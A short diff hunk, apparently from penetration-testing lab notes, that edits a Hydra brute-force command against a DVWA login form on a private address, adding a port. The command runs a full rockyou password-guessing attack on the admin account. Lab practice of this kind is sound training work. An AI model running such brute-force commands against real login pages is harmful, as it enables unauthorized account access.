@@ -66,7 +66,7 @@ hydra -P /usr/shared/wordlists/rockyou.txt
 
 ### DVWA Authentication
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 	
-	  192.168.7.159 http-get-form 
+	  192.168.7.159 -s 8080 http-get-form 
 	  "/dvwa/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:F=password incorrect"
 	  -f
 	  -vVd
